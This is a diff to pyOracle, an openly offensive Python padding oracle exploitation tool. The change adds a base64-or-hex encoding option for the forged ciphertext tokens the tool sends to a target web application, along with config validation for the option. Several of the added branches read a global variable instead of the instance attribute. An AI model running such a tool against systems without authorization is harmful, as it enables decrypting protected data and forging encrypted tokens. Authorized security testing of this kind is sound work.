@@ -1,4 +1,4 @@
-# pyOracle 2.0
+# pyOracle 2.0.1
 # A python padding oracle vulnerability exploitation tool
 # By Paul Mueller (l1qu1d)
 
@@ -88,7 +88,7 @@ def paddify(string,blocksize):
 # The job object holds the state for the encrypt/decrypt operation and contains the majority of the cryptographic code
 class Job:
     # set variables for the instance 
-    def __init__(self,blocksize,mode,debug,sourceString,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies):
+    def __init__(self,blocksize,mode,debug,sourceString,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode):
     
         print('[*]Initializing job....')
         
@@ -125,6 +125,7 @@ class Job:
         self.oracleText = oracleText
         self.vulnerableParameter = vulnerableParameter
         self.inputMode = inputMode
+        self.encodingMode = encodingMode
             
             
         # establish state on current completed block
@@ -226,7 +227,13 @@ class Job:
         sys.exit(2)
     
     def decryptBlockFail(self,padding_array,tempTokenBytes):
-        tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) #re-base64 that string
+
+        if encodingMode == 'base64':
+            tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) #re-base64 that string
+
+        if encodingMode == 'hex':
+            tempToken = tempTokenBytes.hex().upper()
+
         writeToLog('No characters produced valid padding. For the current block aborting')
         print('\n[!]ERROR! No characters produced valid padding! This must mean there was previously an irrecoverable error!')
         print('[!]DEBUG INFO:')
@@ -277,7 +284,12 @@ class Job:
                     
                     padding_array[k] = v ^ padding_num
                 tempTokenBytes = bytearray(self.fakeIV() + padding_array + previousBlock) 
-                tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) 
+
+                if encodingMode == 'base64':
+                    tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) 
+
+                if encodingMode == 'hex':
+                    tempToken = tempTokenBytes.hex().upper()
                 result = self.makeRequest(tempToken) #make the request with the messed with encryptedstring
                 
 
@@ -364,7 +376,13 @@ class Job:
                     
                     
                 tempTokenBytes = bytearray(self.fakeIV() + padding_array + tempblock) #put the bytes back together into a string
-                tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) #re-base64 that string
+
+                if self.encodingMode == 'base64':
+                    tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes)) #re-base64 that string
+
+                if self.encodingMode == 'hex':
+                    tempToken = tempTokenBytes.hex().upper()
+
                 result = self.makeRequest(tempToken) #make the request with the messed with encryptedstring
 
                 if self.debug:
@@ -436,8 +454,12 @@ class Job:
                   
             # add in the "first" (last) block of all 0's
             joinedCrypto = b''.join([joinedCrypto,bytes([0] * job.blocksize)])
+            
+            if encodingMode == 'base64':
+                encryptTemp = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))
 
-            encryptTemp = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))
+            if encodingMode == 'hex':
+                encryptTemp = joinedCrypto.hex().upper()
             oracleCheckResult = self.makeRequest(encryptTemp) #make the request with the messed with encryptedstring
            
             #if the oracleCheck failed... (not solved)
@@ -454,11 +476,16 @@ class Job:
     def decryptInit(self):
         
         # Run the string through a URL decoder
-        decoded_sourcestring = urllib.parse.unquote(args.input)
+        unquoted_sourcestring = urllib.parse.unquote(args.input)
   
-        #unbase64 the encrypted string
-        unbase64_sourcestring = binascii.a2b_base64(decoded_sourcestring)
-        bytemap = list(unbase64_sourcestring)
+        # decode the encrypted string
+
+        if encodingMode == 'base64':
+            decoded_sourcestring = binascii.a2b_base64(unquoted_sourcestring)
+        if encodingMode == 'hex':
+            decoded_sourcestring = bytes.fromhex(unquoted_sourcestring)
+
+        bytemap = list(decoded_sourcestring)
 
         # Save the bytemap to the object in case operation is interupted
         self.bytemap = bytemap
@@ -490,7 +517,7 @@ class Job:
         print(f"\n[+] (non-IV) Block Count: {self.blockCount}")
         
         if self.debug:
-            print('\n[#]decimal representation of the unbase64 token value'  + '\n')
+            print('\n[#]decimal representation of the decoded token value'  + '\n')
             print('*************************************************')
             print(self.bytemap)
             print('*************************************************\n')
@@ -627,6 +654,7 @@ else:
     oracleText  = config['default']['oracleText']
     vulnerableParameter = config['default']['vulnerableParameter']
     inputMode = config['default']['inputMode']
+    encodingMode = config['default']['encodingMode']
     
     # config value validation
     
@@ -638,8 +666,15 @@ else:
         
     else:
         if ((oracleMode != "search") and (oracleMode != "negative")):
-            handleError("[x]CONFIG ERROR: oracleMode required")
+            handleError("[x]CONFIG ERROR: invalid oracleMode")
 
+    # validate encodingMode
+    if not encodingMode:
+        handleError("[x]CONFIG ERROR: encodingMode required")
+
+    else:
+        if ((encodingMode != "base64") and (encodingMode != "hex")):
+            handleError("[x]CONFIG ERROR: invalid encodingMode")
     
 
     # Validate HTTP Method
@@ -709,7 +744,7 @@ else:
 
 
     # Initialize Job object
-    job = Job(blocksize,args.mode,args.debug,args.input,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies)
+    job = Job(blocksize,args.mode,args.debug,args.input,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode)
     job.initialize()
 
 print(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {args.input}')
@@ -754,8 +789,12 @@ if job.mode == "encrypt":
         # add in the "first" (last) bock of all 0's
         joinedCrypto = b''.join([joinedCrypto,bytes([0] * job.blocksize)])
 
-        
-    encryptFinal = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))
+    if encodingMode == 'base64':
+        encryptFinal = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))
+
+    if encodingMode == 'hex':
+        encryptFinal = joinedCrypto.hex().upper()
+
     print(f"[!]Encrypt final result: {encryptFinal}")
         
 
@@ -769,7 +808,3 @@ if job.mode == "decrypt":
     pass
 
 #job.printProgress()
-
-
-
-
